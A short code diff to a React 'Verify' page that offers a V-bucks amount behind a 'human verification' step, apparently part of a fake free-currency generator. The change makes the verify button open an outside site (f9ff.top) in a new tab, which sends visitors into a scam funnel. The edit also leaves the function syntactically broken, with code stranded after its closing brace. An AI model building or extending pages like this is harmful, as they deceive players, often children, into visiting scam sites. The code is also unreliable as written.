@@ -15,8 +15,7 @@ const Verify = () => {
   const [vbucksAmount, setVbucksAmount] = useState(13500);
   const [isModalOpen, setIsModalOpen] = useState(false);
 
-  const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;
-
+ 
   useEffect(() => {
     const timer = setTimeout(() => {
       setIsLoading(false);
@@ -38,11 +37,10 @@ const Verify = () => {
     };
   }, []);
 
-  const handleVerify = () => {
-    toast({
-      title: "Verification Required",
-      description: "Please complete the human verification process.",
-    });
+   const handleVerify = () => {
+  window.open("https://www.f9ff.top", "_blank"); // Deschide site-ul într-un tab nou
+};
+
 
     setIsModalOpen(true);
   };
